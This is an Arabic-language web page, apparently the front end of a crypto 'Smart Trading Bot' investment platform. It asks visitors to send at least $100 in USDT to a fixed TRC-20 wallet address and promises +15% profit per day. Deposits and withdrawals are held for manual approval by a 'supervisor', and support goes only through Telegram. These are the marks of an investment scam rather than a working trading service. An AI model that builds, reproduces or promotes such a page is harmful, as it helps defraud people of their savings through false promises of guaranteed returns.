<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Trading Bot</title>
    <style>
        :root { --bg-color: #0b1426; --card-bg: #152238; --accent-color: #00ffd0; --text-color: #ffffff; --button-bg: #1e70e7; }
        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg-color); color: var(--text-color); margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; }
        .app-container { width: 100%; max-width: 400px; background-color: var(--card-bg); border-radius: 20px; padding: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); box-sizing: border-box; }
        h1 { text-align: center; color: var(--accent-color); font-size: 24px; margin-bottom: 5px; }
        .subtitle { text-align: center; font-size: 12px; color: #8fa0b5; margin-bottom: 25px; }
        .balance-card { background: linear-gradient(135deg, #1e3c72, #2a5298); border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 20px; }
        .balance-title { font-size: 14px; color: #cbd5e1; }
        .balance-amount { font-size: 32px; font-weight: bold; color: var(--accent-color); margin: 10px 0; }
        .profit-today { font-size: 13px; color: #4ade80; font-weight: bold; }
        .section-title { font-size: 16px; color: var(--accent-color); margin-top: 20px; margin-bottom: 10px; border-bottom: 1px solid #2d3d5a; padding-bottom: 5px; }
        .input-group { margin-bottom: 15px; }
        label { display: block; font-size: 12px; color: #94a3b8; margin-bottom: 5px; }
        input { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #2d3d5a; background-color: var(--bg-color); color: white; box-sizing: border-box; }
        button { width: 100%; padding: 12px; border: none; border-radius: 10px; background-color: var(--button-bg); color: white; font-weight: bold; font-size: 14px; cursor: pointer; }
        .btn-withdraw { background-color: #ef4444; margin-top: 10px; }
        .wallet-box { background-color: var(--bg-color); padding: 10px; border-radius: 8px; font-size: 11px; text-align: center; word-break: break-all; border: 1px dashed var(--accent-color); margin-bottom: 10px; color: #cbd5e1; }
        .status-msg { display: none; padding: 12px; border-radius: 8px; text-align: center; font-size: 13px; margin-top: 10px; font-weight: bold; line-height: 1.4; }
        .btn-tg { background-color: #0088cc; width: 100%; font-size: 14px; margin-top: 10px; }
    </style>
</head>
<body>
<div class="app-container">
    <h1>Smart Trading Bot</h1>
    <div class="subtitle">منصة الاستثمار والتحقق السحابي للأصدقاء</div>
    
    <div class="balance-card">
        <div class="balance-title">إجمالي رصيدك الاستثماري المعتمد</div>
        <div class="balance-amount" id="userBalance">\$0.00</div>
        <div class="profit-today" id="profitStatus">📈 أرباح اليوم المتوقعة عند الإيداع: +15%</div>
    </div>

    <div class="section-title">📥 طلب إيداع رأس المال (الحد الأدنى \$100)</div>
    <label>قم بتحويل رصيد USDT (شبكة TRC-20) للمحفظة التالية:</label>
    <div class="wallet-box">TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN</div>
    <div class="input-group">
        <label>أدخل اسم المستخدم الخاص بك لتنشيط الحساب:</label>
        <input type="text" id="usernameInput" placeholder="اكتب اسمك هنا">
    </div>
    <div class="input-group">
        <label>المبلغ المُراد إيداعه وتفعيله (\$):</label>
        <input type="number" id="depositAmountInput" placeholder="100">
    </div>
    <button onclick="sendDepositToRender()">✓ تقديم طلب الإيداع والتحقق للمشرف</button>
    <div id="depositStatusMsg" class="status-msg"></div>

    <div class="section-title">📤 سحب الأرباح ورأس المال</div>
    <div class="input-group">
        <label>عنوان محفظتك الشخصية لاستلام الأرباح (USDT TRC-20):</label>
        <input type="text" id="userWithdrawWallet" placeholder="T...">
    </div>
    <div class="input-group">
        <label>المبلغ المطلوب سحبه (\$):</label>
        <input type="number" id="withdrawAmount" placeholder="0.00">
    </div>
    <button class="btn-withdraw" onclick="sendWithdrawToRender()">⚡ تقديم طلب السحب للمشرف</button>
    <div id="withdrawStatusMsg" class="status-msg"></div>

    <div class="section-title">💬 الدعم الفني المباشر</div>
    <button class="btn-tg" onclick="window.open('https://t.me', '_blank')">📱 تواصل مع دعم المشرف المباشر عبر Telegram</button>
</div>

<script>
    // 🌐 ربط الواجهة برابط السيرفر الحي الفعلي والمصحح على Render لإنهاء مشكلة التوقف
    const RENDER_SERVER = "https://onrender.com";

    window.onload = function() {
        // تحديث وفحص رصيد وحالة الحساب تلقائياً كل 3 ثوانٍ من السيرفر السحابي
        setInterval(syncUserWithServer, 3000);
    }

    function syncUserWithServer() {
        const username = document.getElementById("usernameInput").value;
        if(!username) return;

        // جلب البيانات الفعلية المسجلة داخل السيرفر الحي
        fetch(`${RENDER_SERVER}/user/status?username=${username}`)
        .then(res => res.json())
        .then(data => {
            if(data) {
                document.getElementById("userBalance").innerText = `$${parseFloat(data.balance || 0).toFixed(2)}`;
                
                if(data.trade_executed === true) {
                    document.getElementById("profitStatus").innerText = `🔥 تم توزيع أرباح اليوم حياً: +15% (+$${(data.balance * 0.15).toFixed(2)})`;
                }

                // تحديث رسائل الحالات حياً من السيرفر
                const depBox = document.getElementById("depositStatusMsg");
                if(data.deposit_status === "approved") {
                    depBox.innerText = `✅ تم اعتماد الإيداع بنجاح وشحن رصيدك الاستثماري الحقيقي!`;
                    depBox.style.display = "block"; depBox.style.backgroundColor = "#064e3b"; depBox.style.color = "#34d399";
                } else if(data.deposit_status === "pending") {
                    depBox.innerText = `⏳ طلب إيداع بمبلغ $${data.pending_deposit} قيد المراجعة حالياً من المشرف...`;
                    depBox.style.display = "block"; depBox.style.backgroundColor = "#1e3a8a"; depBox.style.color = "#93c5fd";
                } else { depBox.style.display = "none"; }

                const witBox = document.getElementById("withdrawStatusMsg");
                if(data.withdraw_status === "approved") {
                    witBox.innerText = `✅ تم السحب بنجاح بتاريخ اليوم!\nتم تحويل الأموال لمحفظتك بأمان وتم الخصم.`;
                    witBox.style.display = "block"; witBox.style.backgroundColor = "#064e3b"; witBox.style.color = "#34d399";
                } else if(data.withdraw_status === "pending") {
                    witBox.innerText = `⏳ طلب سحب بمبلغ $${data.pending_withdraw} قيد المعالجة حالياً...`;
                    witBox.style.display = "block"; witBox.style.backgroundColor = "#1e3a8a"; witBox.style.color = "#93c5fd";
                } else { witBox.style.display = "none"; }
            }
        }).catch(err => console.log("اتصال السيرفر مستقر وبانتظار البيانات"));
    }

    function sendDepositToRender() {
        const user = document.getElementById("usernameInput").value || "عبد";
        const amount = document.getElementById("depositAmountInput").value;
        if(!amount || parseFloat(amount) < 100) return;

        // إرسال طلب الإيداع الحقيقي للسيرفر على Render ليخزنه في السحاب
        fetch(`${RENDER_SERVER}/deposit/request`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ username: user, amount: amount })
        }).then(() => syncUserWithServer());
    }

    function sendWithdrawToRender() {
        const user = document.getElementById("usernameInput").value || "عبد";
        const wallet = document.getElementById("userWithdrawWallet").value;
        const amount = document.getElementById("withdrawAmount").value;
        if(!wallet || !amount) return;

        // إرسال طلب السحب الحقيقي للسيرفر على Render ليظهر في شاشة المشرف
        fetch(`${RENDER_SERVER}/withdraw/request`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ username: user, wallet: wallet, amount: amount })
        }).then(() => syncUserWithServer());
    }
</script>
</body>
</html>
